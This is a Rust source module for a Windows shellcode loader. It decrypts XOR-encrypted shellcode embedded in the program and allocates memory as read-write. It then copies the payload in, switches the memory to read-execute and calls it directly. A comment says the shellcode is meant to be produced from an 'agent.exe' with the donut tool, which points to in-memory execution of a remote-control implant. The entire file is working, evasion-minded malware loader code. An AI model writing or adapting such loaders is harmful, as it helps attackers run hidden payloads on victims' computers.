//! Shellcode Execution Module
//!
//! This module handles:
//! - Decrypting the embedded XOR-encrypted shellcode
//! - Allocating executable memory
//! - Executing the shellcode in the current process
//!
//! The shellcode should be generated from agent.exe using donut or similar tool

use crate::config::{ENCRYPTED_SHELLCODE, XOR_KEY};

/// Execute the embedded shellcode
#[cfg(target_os = "windows")]
pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
    use std::ptr;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

    // Step 1: Get the encrypted shellcode and XOR key
    let encrypted_shellcode = ENCRYPTED_SHELLCODE;
    let xor_key = XOR_KEY;

    if encrypted_shellcode.is_empty() {
        return Err("No shellcode embedded".into());
    }

    // Step 2: Decrypt shellcode in memory
    let shellcode = xor_decrypt(encrypted_shellcode, xor_key);

    // Step 3: Allocate memory with RW permissions
    let shellcode_len = shellcode.len();
    let mem = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            shellcode_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if mem.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Step 4: Copy shellcode to allocated memory
    unsafe {
        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode_len);
    }

    // Step 5: Change memory protection to RX (Read + Execute)
    let mut old_protect: DWORD = 0;
    let result = unsafe { VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &mut old_protect) };

    if result == 0 {
        return Err("VirtualProtect failed".into());
    }

    // Step 6: Execute shellcode
    // Cast memory to function pointer and call it
    let shellcode_fn: extern "C" fn() = unsafe { std::mem::transmute(mem) };
    shellcode_fn();

    Ok(())
}

/// Decrypt data using XOR (same key as encryption)
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

#[cfg(not(target_os = "windows"))]
pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
    Err("Shellcode execution only supported on Windows".into())
}
